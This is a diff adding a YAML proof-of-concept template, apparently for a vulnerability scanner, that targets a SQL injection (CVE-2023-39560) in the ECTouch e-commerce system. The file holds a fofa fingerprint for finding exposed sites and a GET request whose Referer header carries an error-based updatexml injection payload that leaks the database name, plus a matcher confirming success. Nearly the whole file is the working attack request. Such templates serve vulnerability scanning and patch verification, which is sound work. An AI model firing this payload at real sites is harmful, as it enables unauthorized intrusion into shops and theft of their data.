@@ -1,0 +1,18 @@
+id: poc-yaml-ectouch-e-commerce-systemindex-php-sqli
+info:
+  name: ECTouch 电商系统 index.php SQL注入(CVE-2023-39560)
+  severity: critical
+  tags:
+  - CVE-2023-39560
+  - SQL注入
+  finger: ectouch
+  fofa: icon_hash="127711143"
+requests:
+- method: GET
+  path: /index.php?m=default&c=user&a=register&u=0
+  headers:
+    Referer: 554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:"id";s:49:"0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#";}
+  expression: status_code == 200 && contains(body,"XPATH syntax error") && contains(body,"SQL")
+    && matches(body,`\'~(.*)~\'`)
+variables: {}
+transport: http
